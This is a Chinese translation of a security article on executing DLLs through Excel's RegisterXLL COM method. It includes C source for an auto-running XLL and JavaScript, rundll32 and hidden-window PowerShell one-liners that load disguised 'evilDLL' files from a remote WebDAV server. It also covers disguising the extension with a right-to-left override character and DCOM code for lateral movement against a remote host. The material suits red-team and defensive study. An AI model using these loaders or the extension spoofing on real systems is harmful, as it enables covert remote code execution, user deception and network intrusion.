> 原文链接: https://www.anquanke.com//post/id/86484 


# 【技术分享】如何通过Excel.Application RegisterXLL()方法执行DLL


                                阅读量   
                                **110075**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：gist.github.com/ryhanson
                                <br>原文地址：[https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52](https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52)

译文仅供参考，具体内容表达以及含义原文为准



[![](https://p5.ssl.qhimg.com/t019f3a22c881be45c0.png)](https://p5.ssl.qhimg.com/t019f3a22c881be45c0.png)

译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：70RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

<br>

在Excel中，我们可以通过初始化Excel.Application COM对象，将某个DLL传递给RegisterXLL方法，最终实现通过Excel加载并执行该DLL的目的。DLL所在的路径不一定是本地路径，也可以是指向远程WebDAV服务器的UNC路径。

我们通过WebDAV渠道下载DLL文件时，需要注意的是，DLL仍会被写到本地磁盘中，但所下载的文件与载入到进程中的文件并不一致。这种情况适用于所有通过WebDAV下载的文件，下载的文件在本地磁盘中的具体路径为：

```
C:WindowsServiceProfilesLocalServiceAppDataLocalTempTfsStoreTfs_DAV
```

在使用RegisterXLL函数时，我们需要提供一个XLL加载项，XLL加载项实际上就是一个带有特定导出函数的特定DLL。关于XLL的更多信息可以参考[MSDN](https://msdn.microsoft.com/en-us/library/office/bb687911.aspx)上的相关资料。

我们也可以双击.xll文件来执行XLL，但此时会出现一个安全警告。[@rxwx](https://github.com/rxwx)详细[描述](https://github.com/rxwx)了这种使用场景，同时给出了一个简单的XLL样例。

对于Office而言，非常有趣的一点是它在处理某些文件扩展名时会进行文件格式嗅探，这些文件包括.xls、.xlk以及.doc（可能还涉及其他扩展名）。这意味着我们可以将.xll修改为.xls或者.xlk，然后Office还是可以打开这种文件。然而，这种情况下，我们依然会触发前面提到过的加载项警告信息，同时还有另一个警告信息，提示文件格式与文件扩展名不匹配。

由于加载项警告信息中会显示文件名的完全路径，因此我们可以使某些unicode字符来掩盖.xll扩展名。我最喜欢使用的一种字符就是“[从右向左覆盖字符（Right-to-Left Override Character）](http://www.fileformat.info/info/unicode/char/202e/index.htm)”。使用这种字符，我们就能任意伪造Excel文件的扩展名。比如，文件名“Footbau202Eslx.xll”会显示为“Footballx.xls”，因为从该unicode字符之后的所有字符顺序都会左右颠倒。

如下代码为某个DLL的示例代码，该DLL有一个xlAutoOpen导出函数，函数内部有一条执行语句，这种写法就可以构造出一个XLL文件。与其他DLL文件类似，我们可以在DLL_PROCESS_ATTACH分支中触发DLL的执行。



```
// Compile with: cl.exe notepadXLL.c /LD /o notepad.xll
#include &lt;Windows.h&gt;
__declspec(dllexport) void __cdecl xlAutoOpen(void); 
void __cdecl xlAutoOpen() `{`
    // Triggers when Excel opens
    WinExec("cmd.exe /c notepad.exe", 1);
`}`
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
 )
`{`
switch (ul_reason_for_call)
`{`
case DLL_PROCESS_ATTACH:
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
break;
`}`
return TRUE;
`}`
```

我们可以通过多种方法执行这个XLL文件。

使用Javascript来执行：



```
// Create Instace of Excel.Application COM object
var excel = new ActiveXObject("Excel.Application");
// Pass in path to the DLL (can use any extension)
excel.RegisterXLL("C:\Users\Bob\AppData\Local\Temp\evilDLL.xyz");
// Delivered via WebDAV
excel.RegisterXLL("\\webdavserver\files\evilDLL.jpg");
```

在一行代码中，使用Rundll32.exe以及mshtml.dll来执行：

```
rundll32.exe javascript:"..mshtml.dll,RunHTMLApplication ";x=new%20ActiveXObject('Excel.Application');x.RegisterXLL('\\webdavserver\files\evilDLL.jpg');this.close();
```

使用Powershell来执行：



```
# Create Instace of Excel.Application COM object
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application"))
# Pass in path to the DLL (can use any extension)
$excel.RegisterXLL("C:UsersBobDownloadsevilDLL.txt")
# Delivered via WebDAV
$excel.RegisterXLL("\webdavserverfilesevilDLL.jpg");
# One liner with WebDAV: 
powershell -w hidden -c "IEX ((New-Object -ComObject Excel.Application).RegisterXLL('\webdavserverfilesevilDLL.jpg'))"
```

[@rxwx](https://github.com/rxwx)发现，如果目标环境支持[DCOM](https://twitter.com/buffaloverflow/status/888427071327916032)，那么我们也可以使用这种方法实现横向渗透，如下所示：



```
$Com = [Type]::GetTypeFromProgID("Excel.Application","192.168.1.111")
$Obj = [System.Activator]::CreateInstance($Com)
# Detect Office bitness so proper DLL can be used
$isx64 = [boolean]$obj.Application.ProductCode[21]
# Load DLL from WebDAV
$obj.Application.RegisterXLL("\webdavserveraddinscalcx64.dll")
```

[@rvrsh3ll](https://github.com/rxwx)在[Invoke-DCOM.ps1](https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1)中引入了这种DCOM技术（感谢[@rxwx](https://github.com/rxwx)的研究成果）。

此外，[@MooKitty](https://github.com/MoooKitty)同样给出了XLL的PoC代码。
